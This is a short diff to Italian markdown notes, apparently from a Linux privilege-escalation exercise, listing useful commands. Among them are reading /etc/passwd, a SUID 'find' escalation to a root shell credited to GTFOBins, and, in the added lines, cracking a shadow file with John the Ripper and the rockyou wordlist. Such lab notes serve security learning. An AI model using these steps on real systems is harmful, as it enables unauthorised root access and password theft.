@@ -1,4 +1,4 @@
-##### ESERCITAZIONE 1 PASSAGGI
+##### COMANDI UTILI
 - `uname -a`
 - `cat /etc/os-release`
 - `cat /etc/passwd | grep "bash"`
@@ -48,3 +48,5 @@ creare un utente in `/etc/passwd`
 			- ho scoperto che il suid di find é root, allora eseguo:
 				- `find . -exec /bin/sh -p \; -quit`
 				- trovato su GTFOBins
+`find / -group 42  2>/dev/null`
+`john -w=/usr/share/wordlists/rockyou.txt shadow2`
